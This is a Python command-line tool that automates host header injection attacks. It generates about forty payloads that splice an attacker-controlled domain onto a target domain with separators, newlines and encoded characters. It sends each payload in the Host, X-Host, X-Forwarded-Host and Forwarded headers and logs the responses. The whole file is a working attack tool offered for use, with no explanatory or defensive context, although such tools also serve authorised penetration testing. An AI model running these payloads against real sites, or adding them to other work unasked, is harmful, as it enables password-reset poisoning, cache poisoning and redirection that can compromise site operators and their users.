import requests
import argparse
from termcolor import colored

def generate_payloads(target, attacker):
    return [
        f"{target}&@{attacker}#@{attacker}",
        f"{target};.{attacker}",
        f"{target}:@{attacker}",
        f"{target}:443:\@@{attacker}",
        f"{target}:443\@{attacker}",
        f"{target}:443#\@{attacker}",
        f"{target}:anything@{attacker}",
        f"{target}?@{attacker}",
        f"{target}._.{attacker}",
        f"{target}.-.{attacker}",
        f"{target}.,.{attacker}",
        f"{target}.;.{attacker}",
        f"{target}.!.{attacker}",
        f"{target}.'{attacker}",
        f"{target}.\"{attacker}",
        f"{target}.(.{attacker}",
        f"{target}.).{attacker}",
        f"{target}.{{.{attacker}",
        f"{target}.}}.{attacker}",
        f"{target}.*.{attacker}",
        f"{target}.&.{attacker}",
        f"{target}.`.{attacker}",
        f"{target}.+.{attacker}",
        f"{target}.{attacker}",
        f"{target}.=. {attacker}",
        f"{target}.~.{attacker}",
        f"{target}.$.{attacker}",
        f"{target}[@{attacker}",
        f"{target}@{attacker}",
        f"{target}\\;@{attacker}",
        f"{target}&anything@{attacker}",
        f"{target}# {attacker}",
        f"{target}%23{attacker}",
        f"{attacker}\t{target}",
        f"{attacker}\n{target}",
        f"{attacker}\r{target}",
        f"{attacker} {target}",
        f"{attacker} &@{target}",
        f"{attacker} {target}",
        f"{attacker};https://{target}",
        f"{attacker}:\@@{target}",
        f"0://{attacker}:80;http://{target}:80/",
        f"{attacker}?{target}"
    ]

def send_requests(target, attacker):
    headers_list = ["Host", "X-Host", "X-Forwarded-Host", "Forwarded"]
    payloads = generate_payloads(target, attacker)

    for payload in payloads:
        for header in headers_list:
            headers = {header: payload}
            try:
                response = requests.get(f"http://{target}", headers=headers, timeout=5)
                status_msg = f"[+] Sent {header}: {payload} -> Status: {response.status_code}"
                if response.status_code != 200:
                    print(colored(status_msg, 'red'))
                else:
                    print(status_msg)
            except requests.exceptions.RequestException as e:
                print(colored(f"[-] Error sending {header}: {payload} -> {e}", 'red'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Host Header Injection Tester")
    parser.add_argument("target", help="Target domain to test")
    parser.add_argument("attacker", help="Attacker-controlled domain or webhook")

    args = parser.parse_args()
    send_requests(args.target, args.attacker)
